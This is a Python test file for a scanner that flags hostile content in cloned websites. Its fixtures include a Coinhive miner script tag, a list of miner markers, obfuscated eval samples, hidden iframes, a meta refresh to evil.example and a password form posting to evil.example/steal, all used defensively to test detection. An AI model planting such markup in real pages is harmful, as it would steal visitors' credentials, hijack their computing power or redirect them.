"""Tests for the cloned-content safety scan."""

import pytest

from zfrog.pipeline.safety import (
    Finding,
    SafetyReport,
    domain_of,
    scan_directory,
    scan_html,
    scan_javascript,
)

CLEAN_PAGE = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>Loja Exemplo</title>
<link rel="stylesheet" href="/assets/style.css">
<script src="/assets/app.js" defer></script>
</head>
<body>
<h1>Bem-vindo a Loja Exemplo</h1>
<form action="/busca" method="get"><input type="text" name="q"></form>
<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315"></iframe>
<a href="/sobre">Sobre</a>
<a href="https://example.com/produtos">Produtos</a>
<a href="mailto:contato@example.com">Contato</a>
<img src="/assets/logo.png" alt="logo">
<script>var pagina = 1;</script>
</body>
</html>"""

MINER_PAGE = """<!DOCTYPE html>
<html><head>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
</head><body><p>Oferta</p></body></html>"""

OBFUSCATED_ESCAPES = (
    '<script>eval("\\x68\\x65\\x6c\\x6c\\x6f\\x5f\\x77\\x6f\\x72\\x6c\\x64");</script>'
)
OBFUSCATED_UNICODE = (
    '<script>Function("\\u0065\\u0076\\u0061\\u006c\\u0028\\u0031'
    '\\u002b\\u0031\\u0029")();</script>'
)


class TestCleanContent:
    def test_clean_page_yields_no_findings(self):
        assert scan_html(CLEAN_PAGE, "index.html") == []

    def test_clean_javascript_yields_no_findings(self):
        clean_js = "var total = itens.reduce(function (a, b) { return a + b; }, 0);"
        assert scan_javascript(clean_js) == []

    def test_empty_input(self):
        assert scan_html("") == []
        assert scan_javascript("   ") == []


class TestJavascriptDetectors:
    def test_escaped_eval_is_obfuscated(self):
        findings = scan_html(OBFUSCATED_ESCAPES, "index.html")
        assert [f.kind for f in findings] == ["obfuscated_js"]
        assert findings[0].severity == "medium"
        assert findings[0].file == "index.html"

    def test_escaped_function_is_obfuscated(self):
        assert [f.kind for f in scan_html(OBFUSCATED_UNICODE)] == ["obfuscated_js"]

    def test_from_char_code_threshold(self):
        long_chain = "var s = String.fromCharCode(72,101,108,108,111,32,87,111);"
        short_chain = "var s = String.fromCharCode(72,101,108);"
        assert [f.kind for f in scan_javascript(long_chain)] == ["obfuscated_js"]
        assert scan_javascript(short_chain) == []

    def test_atob_eval(self):
        findings = scan_javascript('eval(atob("aGVsbG8="));')
        assert [f.kind for f in findings] == ["atob_eval"]
        assert findings[0].severity == "high"

    def test_unescape_eval(self):
        assert [f.kind for f in scan_javascript('eval(unescape("%68%69"));')] == ["atob_eval"]

    @pytest.mark.parametrize(
        "marker",
        ["coinhive", "cryptonight", "CoinHive.Anonymous", "webminepool", "minero.cc"],
    )
    def test_crypto_miner_markers(self, marker):
        html = f'<script>var m = "{marker}";</script>'
        findings = [f for f in scan_html(html, "miner.html") if f.kind == "crypto_miner"]
        assert findings
        assert all(f.severity == "high" for f in findings)
        assert all(f.file == "miner.html" for f in findings)

    def test_miner_script_tag_is_detected(self):
        findings = [f for f in scan_html(MINER_PAGE) if f.kind == "crypto_miner"]
        assert [f.evidence for f in findings] == ["coinhive"]

    def test_js_scheme_inside_script(self):
        findings = scan_javascript('location.href = "javascript:alert(1)";')
        assert [f.kind for f in findings] == ["data_uri_script"]


class TestIframes:
    @pytest.mark.parametrize(
        "markup",
        [
            '<iframe src="/x" width="0" height="0"></iframe>',
            '<iframe src="/x" width="1" height="1"></iframe>',
            '<iframe src="/x" style="display:none"></iframe>',
            '<iframe src="/x" style="visibility:hidden"></iframe>',
            '<iframe src="/x" style="position:absolute;left:-9999px;top:-9999px"></iframe>',
        ],
    )
    def test_hidden_iframes_fire(self, markup):
        findings = [f for f in scan_html(markup) if f.kind == "iframe_hidden"]
        assert len(findings) == 1
        assert findings[0].severity == "medium"

    def test_normal_iframe_does_not_fire(self):
        html = '<iframe src="https://www.youtube.com/embed/x" width="560" height="315"></iframe>'
        assert scan_html(html) == []


class TestFormsAndRedirects:
    def test_password_form_over_http_fires(self):
        html = (
            '<form action="http://evil.example/steal" method="post">'
            '<input type="password" name="p"></form>'
        )
        findings = [f for f in scan_html(html, "login.html") if f.kind == "form_exfil"]
        assert len(findings) == 1
        assert findings[0].severity == "high"

    def test_password_form_on_own_domain_over_https_is_fine(self):
        html = (
            '<form action="https://example.com/login" method="post">'
            '<input type="password" name="p"></form>'
        )
        assert [f for f in scan_html(html, "login.html") if f.kind == "form_exfil"] == []

    def test_cross_domain_post_fires_when_page_is_known(self):
        html = '<form action="https://evil.example/x"><input type="text"></form>'
        findings = scan_html(html, "login.html", page_url="https://example.com/login")
        assert [f.kind for f in findings] == ["form_exfil"]

    def test_same_domain_post_is_fine_when_page_is_known(self):
        html = '<form action="https://example.com/x"><input type="text"></form>'
        assert scan_html(html, "login.html", page_url="https://example.com/login") == []

    def test_meta_refresh_to_other_domain_fires(self):
        html = '<meta http-equiv="refresh" content="0;url=http://evil.example/">'
        findings = [f for f in scan_html(html, "index.html") if f.kind == "meta_refresh_external"]
        assert len(findings) == 1
        assert findings[0].severity == "medium"

    def test_meta_refresh_relative_is_fine(self):
        assert scan_html('<meta http-equiv="refresh" content="30;url=/promo">') == []

    def test_meta_refresh_to_own_domain_is_fine(self):
        html = '<meta http-equiv="refresh" content="0;url=https://example.com/x">'
        assert scan_html(html, "index.html", page_url="https://example.com/") == []


class TestUrls:
    def test_bad_tld_link_fires(self):
        findings = [f for f in scan_html('<a href="http://promo.tk/oferta">x</a>')]
        assert [f.kind for f in findings] == ["known_bad_tld"]
        assert findings[0].severity == "low"

    def test_normal_link_is_fine(self):
        assert scan_html('<a href="https://example.com/oferta">x</a>') == []

    @pytest.mark.parametrize("href", ["setup.exe", "run.bat", "loader.js", "/files/tool.jar"])
    def test_executable_download_fires(self, href):
        findings = scan_html(f'<a href="{href}">baixar</a>')
        assert [f.kind for f in findings] == ["suspicious_download"]
        assert findings[0].severity == "medium"

    def test_javascript_url_fires(self):
        findings = scan_html('<a href="javascript:alert(1)">x</a>')
        assert [f.kind for f in findings] == ["data_uri_script"]
        assert findings[0].severity == "high"

    def test_data_uri_src_fires(self):
        findings = scan_html('<img src="data:text/html;base64,PHNjcmlwdD4=">')
        assert [f.kind for f in findings] == ["data_uri_script"]


class TestDomainOf:
    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            ("https://www.example.com/a?b=1", "example.com"),
            ("http://sub.example.com:8080/x", "example.com"),
            ("https://EXAMPLE.com/X", "example.com"),
            ("https://foo.com.br/pagina", "foo.com.br"),
            ("http://a.b.co.uk/x", "b.co.uk"),
            ("example.com/x", "example.com"),
            ("/caminho/relativo", ""),
            ("#ancora", ""),
            ("mailto:contato@example.com", ""),
            ("", ""),
        ],
    )
    def test_domain_of(self, url, expected):
        assert domain_of(url) == expected


class TestDirectory:
    def test_mixed_tree_reports_the_malicious_file(self, tmp_path):
        (tmp_path / "index.html").write_text(CLEAN_PAGE, encoding="utf-8")
        (tmp_path / "evil.html").write_text(MINER_PAGE, encoding="utf-8")

        report = scan_directory(tmp_path, "https://example.com/")

        assert isinstance(report, SafetyReport)
        assert report.files_scanned == 2
        assert report.risk == "high"
        assert {f.file for f in report.findings} == {"evil.html"}
        assert all(isinstance(f, Finding) for f in report.findings)
        assert all(f.severity == "high" for f in report.findings)
        assert "high" in report.summary
        assert str(len(report.findings)) in report.summary

    def test_clean_tree_is_clean(self, tmp_path):
        (tmp_path / "index.html").write_text(CLEAN_PAGE, encoding="utf-8")
        (tmp_path / "sub").mkdir()
        (tmp_path / "sub" / "app.js").write_text("var a = 1;\n", encoding="utf-8")

        report = scan_directory(tmp_path)

        assert report.risk == "clean"
        assert report.findings == []
        assert report.files_scanned == 2
        assert "clean" in report.summary

    def test_javascript_files_are_scanned(self, tmp_path):
        (tmp_path / "loader.js").write_text('eval(atob("aGVsbG8="));', encoding="utf-8")

        report = scan_directory(tmp_path)

        assert report.files_scanned == 1
        assert report.risk == "high"
        assert [f.file for f in report.findings] == ["loader.js"]

    def test_other_extensions_are_ignored(self, tmp_path):
        (tmp_path / "style.css").write_text("body{color:red}", encoding="utf-8")
        (tmp_path / "notes.txt").write_text("coinhive", encoding="utf-8")

        report = scan_directory(tmp_path)

        assert report.files_scanned == 0
        assert report.risk == "clean"
        assert report.findings == []

    def test_risk_is_the_highest_severity_found(self, tmp_path):
        (tmp_path / "low.html").write_text('<a href="http://promo.xyz/x">x</a>', encoding="utf-8")
        assert scan_directory(tmp_path).risk == "low"

        (tmp_path / "medium.html").write_text(
            '<iframe src="/x" style="display:none"></iframe>', encoding="utf-8"
        )
        assert scan_directory(tmp_path).risk == "medium"

        (tmp_path / "high.html").write_text(MINER_PAGE, encoding="utf-8")
        assert scan_directory(tmp_path).risk == "high"

    def test_repeated_marker_is_deduplicated(self):
        html = (
            '<script>var a = "cryptonight";</script>'
            '<script>var b = "cryptonight";</script>'
        )
        findings = [f for f in scan_html(html, "miner.html") if f.kind == "crypto_miner"]
        assert len(findings) == 1
